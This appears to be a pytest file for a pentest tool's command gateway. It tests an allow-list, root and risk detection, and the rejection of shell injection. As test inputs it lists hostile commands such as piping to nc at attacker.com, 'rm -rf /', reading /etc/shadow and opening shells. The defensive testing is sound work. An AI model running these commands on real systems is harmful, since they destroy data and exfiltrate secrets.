from pathlib import Path
import re
import pytest

from src.application.backend_gateway import BackendGateway


FORBIDDEN_PATTERNS = [
    re.compile(r"^\s*from\s+src\.(ai|core)\.", re.MULTILINE),
    re.compile(r"^\s*import\s+src\.(ai|core)(\.|\s|$)", re.MULTILINE),
]


ALLOWED_FILES = {
    "__init__.py",
}


def test_ui_does_not_import_ai_core_directly():
    ui_dir = Path(__file__).resolve().parents[1] / "ui"
    violations = []

    for py_file in ui_dir.glob("*.py"):
        if py_file.name in ALLOWED_FILES:
            continue

        content = py_file.read_text(encoding="utf-8")
        for pattern in FORBIDDEN_PATTERNS:
            if pattern.search(content):
                violations.append(str(py_file))
                break

    assert not violations, (
        "UI katmani dogrudan src.ai/src.core import etmemeli. "
        f"Gateway kullanin. Violations: {violations}"
    )


# =========================================================================
# BackendGateway.parse_command guvenlik testleri
# =========================================================================


class TestParseCommandSecurity:
    """BackendGateway.parse_command() shell injection ve whitelist testleri."""

    def test_normal_ping_command(self) -> None:
        cmd, args, root = BackendGateway.parse_command("ping 192.168.1.1")
        assert cmd == "ping"
        assert args == ["192.168.1.1"]
        assert root is False

    def test_nmap_syn_scan_requires_root(self) -> None:
        cmd, args, root = BackendGateway.parse_command("nmap -sS 10.0.0.1")
        assert cmd == "nmap"
        assert "-sS" in args
        assert root is True

    def test_empty_command_returns_none(self) -> None:
        cmd, args, root = BackendGateway.parse_command("")
        assert cmd is None
        assert args == []

    def test_whitespace_only_returns_none(self) -> None:
        cmd, args, root = BackendGateway.parse_command("   ")
        assert cmd is None

    @pytest.mark.parametrize("injection", [
        "ping 127.0.0.1; rm -rf /",
        "nmap 10.0.0.1 & cat /etc/passwd",
        "ping 127.0.0.1 | nc attacker.com 4444",
        "nmap `whoami`.attacker.com",
        "ping $(cat /etc/shadow)",
        "nmap 10.0.0.1\n rm -rf /",
        "ping 127.0.0.1\x00evil",
    ])
    def test_shell_injection_rejected(self, injection: str) -> None:
        cmd, args, root = BackendGateway.parse_command(injection)
        assert cmd is None, f"Injection should be rejected: {injection!r}"

    @pytest.mark.parametrize("disallowed", [
        "rm -rf /",
        "cat /etc/passwd",
        "python -c 'import os; os.system(\"id\")'",
        "bash -i",
        "nc -lvp 4444",
        "sudo nmap 10.0.0.1",
    ])
    def test_disallowed_command_rejected(self, disallowed: str) -> None:
        cmd, args, root = BackendGateway.parse_command(disallowed)
        assert cmd is None, f"Command should be rejected: {disallowed!r}"

    def test_allowed_commands_accepted(self) -> None:
        for allowed in ["ping", "nmap", "nslookup", "gobuster", "curl", "whois", "sqlmap"]:
            cmd, args, root = BackendGateway.parse_command(f"{allowed} 127.0.0.1")
            assert cmd == allowed, f"{allowed} should be allowed"

    def test_parse_command_with_risk_levels(self) -> None:
        cmd, args, root, risk = BackendGateway.parse_command_with_risk("ping 1.1.1.1")
        assert cmd == "ping"
        assert root is False
        assert risk == "low"

        cmd, args, root, risk = BackendGateway.parse_command_with_risk("nmap -sV 1.1.1.1")
        assert cmd == "nmap"
        assert root is False
        assert risk == "medium"

        cmd, args, root, risk = BackendGateway.parse_command_with_risk("nmap -sS 1.1.1.1")
        assert cmd == "nmap"
        assert root is True
        assert risk == "high"

    def test_parse_command_with_risk_rejects_unsafe(self) -> None:
        cmd, args, root, risk = BackendGateway.parse_command_with_risk("rm -rf /")
        assert cmd is None
        assert risk == "high"

    def test_prepare_structured_command_allows_sqlmap_query_string(self) -> None:
        cmd, args, root, risk = BackendGateway.prepare_structured_command(
            {
                "executable": "sqlmap",
                "arguments": ["-u", "http://target.local/item.php?id=1&lang=en"],
                "requires_root": False,
                "risk_level": "high",
            }
        )
        assert cmd == "sqlmap"
        assert args[1] == "http://target.local/item.php?id=1&lang=en"
        assert root is False
        assert risk == "high"

    def test_prepare_structured_command_allows_shell_wrapper(self) -> None:
        cmd, args, root, risk = BackendGateway.prepare_structured_command(
            {
                "executable": "bash",
                "arguments": ["-c", "curl -sS http://target.local/login.php"],
                "requires_root": False,
                "risk_level": "medium",
            }
        )
        assert cmd == "bash"
        assert args == ["-c", "curl -sS http://target.local/login.php"]
        assert risk == "medium"

    def test_prepare_structured_command_rejects_unknown_executable(self) -> None:
        cmd, args, root, risk = BackendGateway.prepare_structured_command(
            {
                "executable": "python",
                "arguments": ["-c", "print('hi')"],
                "requires_root": False,
                "risk_level": "low",
            }
        )
        assert cmd is None
        assert risk == "high"
